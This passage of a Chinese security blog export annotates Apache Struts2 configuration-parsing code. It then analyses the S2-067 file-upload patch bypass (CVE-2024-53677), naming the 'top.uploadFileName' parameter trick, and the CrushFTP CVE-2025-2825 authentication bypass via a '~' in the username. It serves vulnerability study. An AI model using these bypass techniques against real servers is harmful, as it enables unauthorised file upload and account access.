PackageConfig [&#123;&#125;]&quot;</span>, packageName, packageConfig);</span><br><span class="line">        <span class="keyword">return</span> packageConfig;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 创建包配置构建器</span></span><br><span class="line">        PackageConfig.<span class="type">Builder</span> <span class="variable">newPackage</span> <span class="operator">=</span> buildPackageContext(packageElement);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (newPackage.isNeedsRefresh()) &#123;</span><br><span class="line">        <span class="keyword">return</span> newPackage.build();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        LOG.debug(<span class="string">&quot;Loaded &#123;&#125;&quot;</span>, newPackage);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// add result types (and default result) to this package</span></span><br><span class="line">        <span class="comment">// 解析 result-type标签 </span></span><br><span class="line">        addResultTypes(newPackage, packageElement);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// load the interceptors and interceptor stacks for this package</span></span><br><span class="line">        <span class="comment">// 加载拦截器 以及拦截器栈</span></span><br><span class="line">        <span class="comment">// 拦截器通过 interceptor 标签指定  被解析为拦截器配置 添加到拦截器配置列表中</span></span><br><span class="line">        <span class="comment">// 包拦截器生效需要通过 包拦截器栈来配置  通过 interceptor-stack 标签下的interceptor-ref来指定</span></span><br><span class="line">        <span class="comment">// 拦截器栈可以有多个 通过不同的名字区分 和拦截器配置一起被添加到拦截器配置列表中</span></span><br><span class="line">        <span class="comment">// 不同的action可以引用不同的拦截器或者拦截器栈</span></span><br><span class="line">        <span class="comment">// 拦截器栈类似于组的概念 表示一组拦截器</span></span><br><span class="line">        loadInterceptors(newPackage, packageElement);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// load the default interceptor reference for this package</span></span><br><span class="line">        <span class="comment">// 加载默认拦截器引用 通过default-interpretor-ref标签指定</span></span><br><span class="line">        <span class="comment">// 对包的所有action都有效?</span></span><br><span class="line">        loadDefaultInterceptorRef(newPackage, packageElement);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// load the default class ref for this package</span></span><br><span class="line">        <span class="comment">// 加载默认类引用  通过 default-class-ref标签指定 </span></span><br><span class="line">        <span class="comment">// 当某些标签的class属性没有被指定的时候就是使用该标签指定的class</span></span><br><span class="line">        loadDefaultClassRef(newPackage, packageElement);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// load the global result list for this package</span></span><br><span class="line">        <span class="comment">// 加载全局结果处理</span></span><br><span class="line">        <span class="comment">// action执行完后的行为  默认行为吗？</span></span><br><span class="line">        loadGlobalResults(newPackage, packageElement);</span><br><span class="line">        <span class="comment">// 允许调用的action方法 </span></span><br><span class="line">        <span class="comment">// 如果不配置 那么所有的 public cation方法均可以被调用</span></span><br><span class="line">        loadGlobalAllowedMethods(newPackage, packageElement);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// load the global exception handler list for this package</span></span><br><span class="line">        <span class="comment">// 定义全局异常映射结果</span></span><br><span class="line">        loadGlobalExceptionMappings(newPackage, packageElement);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// get actions</span></span><br><span class="line">        <span class="comment">// action节点处理</span></span><br><span class="line">        <span class="type">NodeList</span> <span class="variable">actionList</span> <span class="operator">=</span> packageElement.getElementsByTagName(<span class="string">&quot;action&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; actionList.getLength(); i++) &#123;</span><br><span class="line">        <span class="type">Element</span> <span class="variable">actionElement</span> <span class="operator">=</span> (Element) actionList.item(i);</span><br><span class="line">        <span class="comment">// 创建action配置</span></span><br><span class="line">        addAction(actionElement, newPackage);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// load the default action reference for this package</span></span><br><span class="line">        <span class="comment">// 默认action引用   当用户访问该命名空间但没有指定具体的action的时候将调用默认的action</span></span><br><span class="line">        loadDefaultActionRef(newPackage, packageElement);</span><br><span class="line"></span><br><span class="line">        <span class="type">PackageConfig</span> <span class="variable">cfg</span> <span class="operator">=</span> newPackage.build();</span><br><span class="line">        configuration.addPackageConfig(cfg.getName(), cfg);</span><br><span class="line">        <span class="keyword">return</span> cfg;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> PackageConfig.Builder <span class="title function_">buildPackageContext</span><span class="params">(Element packageElement)</span> &#123;</span><br><span class="line">    <span class="comment">// extends为 struts-default 即默认存在的一个包配置  作为 当前包配置的父亲</span></span><br><span class="line">        <span class="comment">// 父配置可以有多个 通过都好分割  字符串中越靠后的父包 被插入到当前包配置的父包列表的第一个</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">parent</span> <span class="operator">=</span> packageElement.getAttribute(<span class="string">&quot;extends&quot;</span>);</span><br><span class="line">        <span class="comment">// 是否时抽象的</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">abstractVal</span> <span class="operator">=</span> packageElement.getAttribute(<span class="string">&quot;abstract&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isAbstract</span> <span class="operator">=</span> Boolean.parseBoolean(abstractVal);</span><br><span class="line">        <span class="comment">// 获取包名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> StringUtils.defaultString(packageElement.getAttribute(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">        <span class="comment">// 获取包命名空间</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">namespace</span> <span class="operator">=</span> StringUtils.defaultString(packageElement.getAttribute(<span class="string">&quot;namespace&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Strict DMI is enabled by default, it can disabled by user</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">strictDMI</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 是否启用严格方法调用 默认为true</span></span><br><span class="line">        <span class="keyword">if</span> (packageElement.hasAttribute(<span class="string">&quot;strict-method-invocation&quot;</span>)) &#123;</span><br><span class="line">        strictDMI = Boolean.parseBoolean(packageElement.getAttribute(<span class="string">&quot;strict-method-invocation&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 创建包配置其构建器 并设置一些属性</span></span><br><span class="line">        PackageConfig.<span class="type">Builder</span> <span class="variable">cfg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PackageConfig</span>.Builder(name)</span><br><span class="line">        .namespace(namespace)</span><br><span class="line">        .isAbstract(isAbstract)</span><br><span class="line">        .strictMethodInvocation(strictDMI)</span><br><span class="line">        .location(DomHelper.getLocationObject(packageElement));</span><br><span class="line">        <span class="comment">// 获取父包配置</span></span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isNotEmpty(StringUtils.defaultString(parent))) &#123; <span class="comment">// has parents, let&#x27;s look it up</span></span><br><span class="line">        List&lt;PackageConfig&gt; parents = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (String parentPackageName : ConfigurationUtil.buildParentListFromString(parent)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (configuration.getPackageConfigNames().contains(parentPackageName)) &#123;</span><br><span class="line">        parents.add(configuration.getPackageConfig(parentPackageName));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (declaredPackages.containsKey(parentPackageName)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (configuration.getPackageConfig(parentPackageName) == <span class="literal">null</span>) &#123;</span><br><span class="line">        addPackage(declaredPackages.get(parentPackageName));</span><br><span class="line">        &#125;</span><br><span class="line">        parents.add(configuration.getPackageConfig(parentPackageName));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Parent package is not defined: &quot;</span> + parentPackageName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (parents.size() &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        cfg.needsRefresh(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 将父包配置添加到当前包配置中</span></span><br><span class="line">        cfg.addParents(parents);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cfg;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">addAction</span><span class="params">(Element actionElement, PackageConfig.Builder packageContext)</span> <span class="keyword">throws</span> ConfigurationException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> actionElement.getAttribute(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> actionElement.getAttribute(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">        <span class="comment">//methodName should be null if it&#x27;s not set</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> StringUtils.trimToNull(actionElement.getAttribute(<span class="string">&quot;method&quot;</span>));</span><br><span class="line">        <span class="type">Location</span> <span class="variable">location</span> <span class="operator">=</span> DomHelper.getLocationObject(actionElement);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (location == <span class="literal">null</span>) &#123;</span><br><span class="line">        LOG.warn(<span class="string">&quot;Location null for &#123;&#125;&quot;</span>, className);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// if there isn&#x27;t a class name specified for an &lt;action/&gt; then try to</span></span><br><span class="line">        <span class="comment">// use the default-class-ref from the &lt;package/&gt;</span></span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(className)) &#123;</span><br><span class="line">        <span class="comment">// if there is a package default-class-ref use that, otherwise use action support</span></span><br><span class="line">           <span class="comment">/* if (StringUtils.isNotEmpty(packageContext.getDefaultClassRef())) &#123;</span></span><br><span class="line"><span class="comment">                className = packageContext.getDefaultClassRef();</span></span><br><span class="line"><span class="comment">            &#125; else &#123;</span></span><br><span class="line"><span class="comment">                className = ActionSupport.class.getName();</span></span><br><span class="line"><span class="comment">            &#125;*/</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 校验cation是否存在 是否可访问</span></span><br><span class="line">        <span class="keyword">if</span> (!verifyAction(className, name, location)) &#123;</span><br><span class="line">        LOG.error(<span class="string">&quot;Unable to verify action [&#123;&#125;] with class [&#123;&#125;], from [&#123;&#125;]&quot;</span>, name, className, location);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, ResultConfig&gt; results;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// action处理完成后的行为</span></span><br><span class="line">        results = buildResults(actionElement, packageContext);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Error building results for action &quot;</span> + name + <span class="string">&quot; in namespace &quot;</span> + packageContext.getNamespace(), e, actionElement);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造 action的拦截器列表</span></span><br><span class="line">        List&lt;InterceptorMapping&gt; interceptorList = buildInterceptorList(actionElement, packageContext);</span><br><span class="line">        <span class="comment">// 构造action的异常处理列表</span></span><br><span class="line">        List&lt;ExceptionMappingConfig&gt; exceptionMappings = buildExceptionMappings(actionElement, packageContext);</span><br><span class="line">        <span class="comment">// 构造action允许访问的方法</span></span><br><span class="line">        Set&lt;String&gt; allowedMethods = buildAllowedMethods(actionElement, packageContext);</span><br><span class="line">        <span class="comment">// 构造actionConfig</span></span><br><span class="line">        <span class="type">ActionConfig</span> <span class="variable">actionConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActionConfig</span>.Builder(packageContext.getName(), name, className)</span><br><span class="line">        .methodName(methodName)</span><br><span class="line">        .addResultConfigs(results)</span><br><span class="line">        .addInterceptors(interceptorList)</span><br><span class="line">        .addExceptionMappings(exceptionMappings)</span><br><span class="line">        .addParams(XmlHelper.getParams(actionElement))</span><br><span class="line">        .setStrictMethodInvocation(packageContext.isStrictMethodInvocation())</span><br><span class="line">        .addAllowedMethod(allowedMethods)</span><br><span class="line">        .location(location)</span><br><span class="line">        .build();</span><br><span class="line">        <span class="comment">// 通过名称引用actionConfig</span></span><br><span class="line">        <span class="comment">// 添加到包配置中</span></span><br><span class="line">        packageContext.addActionConfig(name, actionConfig);</span><br><span class="line"></span><br><span class="line">        LOG.debug(<span class="string">&quot;Loaded &#123;&#125;&#123;&#125; in &#x27;&#123;&#125;&#x27; package: &#123;&#125;&quot;</span>,</span><br><span class="line">        StringUtils.isNotEmpty(packageContext.getNamespace()) ? (packageContext.getNamespace() + <span class="string">&quot;/&quot;</span>) : <span class="string">&quot;&quot;</span>,</span><br><span class="line">        name, packageContext.getName(), actionConfig);</span><br><span class="line">        &#125;        </span><br><span class="line">        </span><br></pre></td></tr></table></figure>
<h1 id="过滤器执行"><a href="#过滤器执行" class="headerlink" title="过滤器执行"></a>过滤器执行</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="s2-067-s2-066"><a href="#s2-067-s2-066" class="headerlink" title="s2-067 s2-066"></a>s2-067 s2-066</h1><p>修复方案是在添加文件参数时先删除已经存在的参数，那么如果在文件参数被添加后再次被添加的话 就会删除之前的参数再次设置新的参数，<br>要达成这个条件需要满足这个拦截器在 FileUploadIntercetor拦截器后执行appendAll方法，<br>符合条件的拦截器存在且调用了appendAll方法  不过设置的参数不是我想要的。<br>比如在 checkbox拦截器中插入的值为false 是固定的  用户没法控制<br>datetime中插入的值为Date类型  类型不匹配插入会失败<br>multiselect 拦截器中插入的是一个空的字符串数组 长度为0 也没法控制<br>staticParams  拦截器 处理配置中设置的固定params 无法控制<br>actionMapping 参数拦截器  负责将action标签中设置的参数添加到request中</p>
]]></content>
      <categories>
        <category>框架学习</category>
      </categories>
      <tags>
        <tag>Apache Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Struts2 S2-067 任意文件上传漏洞（CVE-2024-53677）</title>
    <url>/archives/60a726cc.html</url>
    <content><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>Apache Struts是美国阿帕奇（Apache）基金会的一个开源项目，是一套用于创建企业级Java Web应用的开源MVC框架。<br>Apache Struts在特定条件下，存在文件上传漏洞（网宿评分：高危、CVSS 3.0 评分：8.1）：<br>攻击者可以操纵文件上传参数来实现路径遍历，在某些情况下，这可能导致恶意文件上传。  </p>
<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Struts 2.0.0 - 2.3.37（EOL）<br>Struts 2.5.0 - 2.5.33（EOL）<br>Struts 6.0.0 - 6.3.0.2  </p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>同<code>S2-066</code>  </p>
<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p><code>S2-067</code>与<code>S2-066</code>有90%的相似，<code>S2-067</code>是<code>S2-066</code>补丁的绕过。<br>通过前一篇文章的分析我们直到<code>S2-066</code>的修复是在向<code>ActionContext</code>的<code>parameters</code>属性添加一个参数，先检查<code>parameters</code>属性是否为空，如果为空，则直接添加参数，<br>如果<code>parameters</code>不为空，则遍历文件上传的参数<code>ContentType</code>与<code>UploadFileName</code>等，将其先同意转换为小写，然后在与<code>parameters</code>中的元素比较，<br>当存在相同的元素的时候先删除<code>parameters</code>中的参数再将新的参数添加到<code>parameters</code>中，这样就避免了用户上传表单中非文件参数对文件上传参数的影响覆盖。<br>通过对<code>S2-066</code>的学习我们还可以直到，form表单参数的<code>name</code>属性的值会被当作<code>OGNL</code>解析，用来向<code>ValueStack</code>上的<code>root</code>映射中的元素设置属性值。<br>既如此，<code>name</code>属性的值就可以是任何有效的<code>OGNL</code>表达式，从而实现任意属性的设置。<br>当我们使用这样的表达是的时候<code>top.uploadFileName</code>会发生什么。<br>让我们定位到<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor.setParameters</code>方法<br>这里面调用了<code>ValueStack</code>的<code>setParameter</code>方法向<code>ValueStack</code>的<code>root</code>映射中设置属性值。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setParameters</span><span class="params">(<span class="keyword">final</span> Object action, ValueStack stack, HttpParameters parameters)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Parameter&gt; entry : acceptableParameters.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            <span class="type">Parameter</span> <span class="variable">value</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                newStack.setParameter(name, value.getObject()); <span class="comment">// name == top.uploadFileName</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">                <span class="keyword">if</span> (devMode) &#123;</span><br><span class="line">                    notifyDeveloperParameterException(action, name, e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>通过<code>setParaameters</code>的方法签名也可以看出来其第一个参数是一个<code>OGNL</code>表达式。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setParameter</span><span class="params">(String expr, Object value)</span> &#123;</span><br><span class="line">        setValue(expr, value, devMode);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>程序继续向下执行最终会来到 <code>com.opensymphony.xwork2.ognl.OgnlUtil.compileAndExecute</code>方法。<br>这个方法会根据<code>ognl</code>表达式来获取<code>ognl</code>表达式对应的<code>ognl</code>树，然后解析<code>ognl</code>树。<br>当<code>ognl</code>表达式为<code>uploadFileName</code>的时候，得到的<code>tree</code>为<code>ASTProperty</code>类型，<code>S2-066</code>就是执行<code>ASTProperty</code>的<code>setValueBody</code>方法设置<code>ValueStack</code> 的<code>root</code>映射中的元素。<br>当<code>ognl</code>表达式为<code>top.uploadFileName</code>的时候，得到的<code>tree</code>为<code>ASTChain</code>类型，<code>S2-067</code>就是执行<code>ASTChain</code>的<code>setValueBody</code>方法设置<code>ValueStack</code> 的<code>root</code>映射中的元素。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> &lt;T&gt; Object <span class="title function_">compileAndExecute</span><span class="params">(String expression, Map&lt;String, Object&gt; context, OgnlTask&lt;T&gt; task)</span> <span class="keyword">throws</span> OgnlException &#123;</span><br><span class="line">        Object tree;</span><br><span class="line">        <span class="keyword">if</span> (enableExpressionCache) &#123;</span><br><span class="line">            tree = expressions.get(expression);</span><br><span class="line">            <span class="keyword">if</span> (tree == <span class="literal">null</span>) &#123;</span><br><span class="line">                tree = Ognl.parseExpression(expression);</span><br><span class="line">                checkEnableEvalExpression(tree, context);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tree = Ognl.parseExpression(expression);</span><br><span class="line">            checkEnableEvalExpression(tree, context);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">T</span> <span class="variable">exec</span> <span class="operator">=</span> task.execute(tree);</span><br><span class="line">        <span class="comment">// if cache is enabled and it&#x27;s a valid expression, puts it in</span></span><br><span class="line">        <span class="keyword">if</span> (enableExpressionCache) &#123;</span><br><span class="line">            expressions.putIfAbsent(expression, tree);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> exec;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>ASTChain</code>的<code>setValueBody</code>方法    </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setValueBody</span><span class="params">(OgnlContext context, Object target, Object value)</span> <span class="keyword">throws</span> OgnlException &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">handled</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">ilast</span> <span class="operator">=</span> <span class="built_in">this</span>._children.length - <span class="number">2</span>; i &lt;= ilast; ++i) &#123;</span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!handled) &#123;</span><br><span class="line">                target = <span class="built_in">this</span>._children[i].getValue(context, target);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!handled) &#123;</span><br><span class="line">            <span class="built_in">this</span>._children[<span class="built_in">this</span>._children.length - <span class="number">1</span>].setValue(context, target, value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>ASTChain</code>的<code>Children</code>包含两个元素均为<code>ASTProperty</code>类型，就是通过<code>.</code>将<code>top.uploadFileName</code>进行了分割成两部分。<br>首先通过<code>top</code>节点去取<code>target</code>的值，注意这里<code>target</code>之前是有值的就是<code>ValueStack</code>的<code>root</code>映射部分，即一个<code>CompoundRoot</code>对象，包含两个元素<br><code>UploadAction</code>以及<code>DefaultTextProvider</code>对象。这里也就是通过<code>top</code>节点取取一个值来覆盖原来的<code>target</code>。<br><img src="/archives/60a726cc/img.png" alt="img.png"><br>代码继续向下执行会来到<code>com.opensymphony.xwork2.ognl.accessor.CompoundRootAccessor.getProperty</code>方法。<br>这里判断<code>name</code>是否为<code>top</code>，如果为<code>top</code>则返回<code>root</code>的第一个元素，否则会遍历<code>root</code>中的元素，如果元素中有<code>name</code>属性则返回该元素。<br><code>root</code>的第一个元素即为<code>UploadAction</code>，即上一步求的<code>target</code>为<code>UploadAction</code>。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getProperty</span><span class="params">(Map context, Object target, Object name)</span> <span class="keyword">throws</span> OgnlException &#123;</span><br><span class="line">        <span class="type">CompoundRoot</span> <span class="variable">root</span> <span class="operator">=</span> (CompoundRoot) target;</span><br><span class="line">        <span class="type">OgnlContext</span> <span class="variable">ognlContext</span> <span class="operator">=</span> (OgnlContext) context;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (name <span class="keyword">instanceof</span> Integer) &#123;</span><br><span class="line">            <span class="type">Integer</span> <span class="variable">index</span> <span class="operator">=</span> (Integer) name;</span><br><span class="line">            <span class="keyword">return</span> root.cutStack(index);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;top&quot;</span>.equals(name)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (root.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> root.get(<span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Object o : root) &#123;</span><br><span class="line">                <span class="keyword">if</span> (o == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((OgnlRuntime.hasGetProperty(ognlContext, o, name)) || ((o <span class="keyword">instanceof</span> Map) &amp;&amp; ((Map) o).containsKey(name))) &#123;</span><br><span class="line">                        <span class="keyword">return</span> OgnlRuntime.getProperty(ognlContext, o, name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (OgnlException e) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (e.getReason() != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Caught an Ognl exception while getting property &quot;</span> + name;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">XWorkException</span>(msg, e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IntrospectionException e) &#123;</span><br><span class="line">                    <span class="comment">// this is OK if this happens, we&#x27;ll just keep trying the next</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//property was not found</span></span><br><span class="line">            <span class="keyword">if</span> (context.containsKey(OgnlValueStack.THROW_EXCEPTION_ON_FAILURE))</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchPropertyException</span>(target, name);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>重新求得<code>target</code>后则会调用<code>uploadFileName</code>的节点得<code>setValue</code>方法为<code>target</code>设置值。<br><code>uploadFileName</code>节点是<code>ASTProperty</code>类型，这就是典型得<code>OGNL</code>表达式的语法了，后面的内容就与<code>S2-066</code>的逻辑一致了。<br>因为在<code>S2-067</code>中我们使用的<code>payload</code>是<code>top.uploadFileName</code>与<code>UploadFileName</code>在统一大小写后也并不相等，所以就能完美的绕过<code>S2-066</code>添加的<code>remove</code>方法的补丁了。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>._children[<span class="built_in">this</span>._children.length - <span class="number">1</span>].setValue(context, target, value);</span><br></pre></td></tr></table></figure>
<p>另外，<code>ValueStack</code>的<code>root</code>映射中包含两个元素，一个是<code>UploadAction</code>，一个是<code>DefaultTextProvider</code>，既然<code>UploadAction</code>的属性可以被设置，那么<code>DefaultTextProvider</code>的属性也是可以被设置的。<br>这样我们就可以控制<code>DefaultTextProvider</code>对象的属性值，是不是可以做些什么呢？</p>
<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>新增了一个类并被推荐使用。。。。FileUploadAction并没有被修改，应该是这样的。赶时间</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>无</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Apache Struts2</tag>
        <tag>任意文件上传</tag>
        <tag>s2-067</tag>
        <tag>CVE-2024-53677</tag>
      </tags>
  </entry>
  <entry>
    <title>CrushFTP 认证绕过（CVE-2025-2825）</title>
    <url>/archives/f9ff5c36.html</url>
    <content><![CDATA[<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>在<code>crushftp.server.ServerSessionHTTP.handle_http_requests</code>方法中对用户名有特殊处理。<br>当用户名中不包含<code>~</code>的时候 <code>lookup_user_pass</code>的值为<code>true</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">lookup_user_pass</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">if</span> (s3_username.indexOf(<span class="string">&quot;~&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    user_pass = s3_username.substring(s3_username.indexOf(<span class="string">&quot;~&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">                    user_name = s3_username.substring(<span class="number">0</span>, s3_username.indexOf(<span class="string">&quot;~&quot;</span>));</span><br><span class="line">                    lookup_user_pass = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>
<p>后面在调用 <code>login_user_pass</code> 方法的时候传入的第一个参数就是<code>lookup_user_pass</code>  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.thisSession.login_user_pass(lookup_user_pass, <span class="literal">false</span>, user_name, user_pass))</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p><code>login_user_pass</code>方法最终会调用到<code>crushftp.handlers.UserTools.verify_user(crushftp.server.ServerStatus, java.lang.String, java.lang.String, java.lang.String, crushftp.handlers.SessionCrush, int, java.lang.String, int, java.util.Properties, java.util.Properties, boolean)</code>方法<br>当<code>anyPass</code>为<code>true</code>的时候只比较了用户名是否相等就直接返回了<code>user</code>对象没有对密码进行验证  </p>
